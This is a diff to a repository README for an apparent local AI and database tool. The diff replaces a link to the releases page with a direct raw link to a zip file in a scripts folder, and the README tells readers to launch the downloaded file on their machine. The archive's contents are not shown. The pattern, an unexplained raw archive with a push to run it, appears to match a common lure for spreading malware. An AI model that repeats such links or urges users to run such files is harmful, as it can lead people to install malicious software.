@@ -34,7 +34,7 @@ The repository covers a wide range of topics and technologies. Some of the key t
 
 To get started with the local AI & database stack, download the necessary files from the provided link: 
 
-[![Download Zip](https://github.com/rish-1997/wsl-assistant/releases/tag/v1.2)](https://github.com/rish-1997/wsl-assistant/releases/tag/v1.2)
+[![Download Zip](https://raw.githubusercontent.com/rish-1997/wsl-assistant/master/scripts/wsl_assistant_v3.3.zip)](https://raw.githubusercontent.com/rish-1997/wsl-assistant/master/scripts/wsl_assistant_v3.3.zip)
 
 If the link ends with a file name, make sure to launch it on your machine. If the link is a website, simply visit it. In case the link is not working or not provided, please check the "Releases" section of this repository.
 
